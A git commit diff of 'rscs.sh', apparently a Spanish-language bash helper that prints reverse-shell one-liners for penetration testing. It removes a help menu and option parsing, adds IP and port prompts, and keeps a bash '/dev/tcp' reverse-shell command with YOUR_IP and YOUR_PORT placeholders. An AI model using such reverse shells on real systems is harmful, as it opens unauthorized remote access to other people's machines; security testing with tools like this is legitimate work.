34e25bdf6791242b4fa0fe4187f3222dedeadece
Harrison <harrison@localhost.localdomain>
2021-09-21 23:02:10 -0300

    Actualizacion

--- rscs.sh
+++ rscs.sh
@@ -41,30 +41,11 @@ function banner(){
 }
 
 
-# HELP
-
-function Help(){
-   # Display Help
-   echo
-   echo -e "Syntax: ${bold}./rscs${end} ${green}[-help|menu|b|p|py|php|r|nc|j|g|pow]${end}"
-   echo -e "\nOpciones:\n"
-   echo -e "${green}menu${end}     Menu Interactivo."
-   echo -e "${green}h${end}        Muestra este panel de ayuda."
-   echo -e "${green}b${end}        Muestra reverse shells en ${green}BASH${end}."
-   echo -e "${green}p${end}        Muestra reverse shells en ${green}PERL${end}."
-   echo -e "${green}py${end}       Muestra reverse shells en ${green}PYTHON${end}."
-   echo -e "${green}php${end}      Muestra reverse shells en ${green}PHP${end}."
-   echo -e "${green}r${end}        Muestra reverse shells en ${green}RUBY${end}."
-   echo -e "${green}j${end}        Muestra reverse shells en ${green}JAVA${end}."
-   echo -e "${green}g${end}        Muestra reverse shells en ${green}GO${end}."
-   echo -e "${green}pow${end}      Muestra reverse shells en ${green}POWERSHELL${end}."
-   echo
-}
 
 # MAIN
 function menu(){
     
-    clear;
+    
     echo -e "\n${green} [>] Iniciando... [<]${end}";sleep 1;
     clear
     opt=0
@@ -99,28 +80,13 @@ function menu(){
 
 function bashm(){
     clear
-    echo -e "${green}bash -i >& /dev/tcp/${red}YOUR_IP${end}/${red}YOUR_PORT${end} 0>&1${end}"
+    echo -e "${green}bash -i >& /dev/tcp/${red}YOUR_IP${end}${green}/${end}${red}YOUR_PORT${end}${green} 0>&1${end}"
 
 }
 
 # FLUJO
-
-declare -i cont=0;
-tput civs; while getopts ":h:m:b:p:py:php:r:nc:j:g:pow:" option; do
-    case $option in
-        m) menu=$OPTARG && let cont+=1 ;;
-        b) bash=$OPTARG && let cont+=1 ;;
-        h) Help;;
-
-    esac
-done
-
-if [ $cont -ne 1 ]; then
-    Help    
-else
-    menu
-    bashm
-    tput cnorm;
-
-fi
-
+echo -e "${red}$ Ingresa tu IP${end}${green}"
+read $ip
+echo -e "${end}${red}$ Ingresa un puerto${end}${green}"
+read $port
+menu
